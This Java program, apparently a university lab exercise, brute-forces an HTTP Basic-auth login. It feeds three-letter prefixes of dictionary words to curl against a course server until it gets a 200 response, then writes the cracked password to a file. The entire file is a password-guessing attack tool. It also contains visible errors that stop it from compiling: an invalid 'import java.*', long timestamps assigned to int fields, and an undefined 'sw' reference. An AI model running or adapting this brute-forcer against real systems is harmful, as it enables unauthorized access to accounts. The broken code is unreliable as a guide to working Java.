

import java.net.*;
import java.io.*;

import java.*;
import java.util.*;

public class Dictionary {

  private static String commandLine = "curl http://sec-crack.cs.rmit.edu./SEC/2/index.php -I -u :";
  private String password;             
  private String previous;             
  private String url;                  
  private int startTime;
  private int endTime;
  private int totalTime;
  private float averageTime;
  private boolean finish;
  private Process curl;
  private BufferedReader bf, responseLine;

  public Dictionary() {

  first();
  finish = true;                           
  previous = "";                           
  Runtime run = Runtime.getRuntime();
  startTime =new Date().getTime();         
  int i=0;
  try {
   try {
     bf = new BufferedReader(new FileReader("words"));
   }
   catch(FileNotFoundException notFound) {
    bf  = new BufferedReader(new FileReader("/usr/share/lib/dict/words"));
   }

   while((password = bf.readLine()) != null) {
    if(password.length()>3) password = password.substring(0,3);
    if(previous.equals(password)) ;
    else {
    previous = password;
    url = commandLine+password;
    curl= run.exec(url);                   
    responseLine=new BufferedReader(new InputStreamReader(curl.getInputStream()));
    
    if(responseLine.readLine().substring(9,12).equals("200")) break;
    }
   }
  }
  catch(IOException ioe) {
    System.out.println("\n IO Exception! \n");
    System.out.println("The current url is:"+ url);
    System.out.println("The current trying password is:"+password);
    finish=false;
  }

  endTime = new Date().getTime();          
  totalTime = (endTime-startTime)/1000;
  System.out.println("   The response time is:"+ totalTime + "  seconds\n");
  if(finish) {
    System.out.println("   The password for  is:"+ password);
    try {
    savePassword(password, totalTime);
    }
    catch (IOException ioec) {
       System.out.println("  not save the password  file Dictionary_pwd.txt ");
    }
  }
  }


  public void savePassword(String passwdString, int time) throws IOException {
  DataOutputStream outputStream = new DataOutputStream(new FileOutputStream("Dictionary_pwd.txt"));
  outputStream.writeChars("The password is:");
  outputStream.writeChars(passwdString+"\n");
  outputStream.writeChars("The response time is: ");
  outputStream.writeChars(sw.toString(time));
  outputStream.writeChars(" seconds\n");
  outputStream.close();
  }

  public void first() {

    System.out.println("\n\n----------------------------------------------");
    System.out.println("   Use curl command and dictionary ");
    System.out.println("  Brute Force the password for user  ");
    System.out.println("----------------------------------------------");
  }

  public static void main(String[] args) {
   new Dictionary();
  }  
}
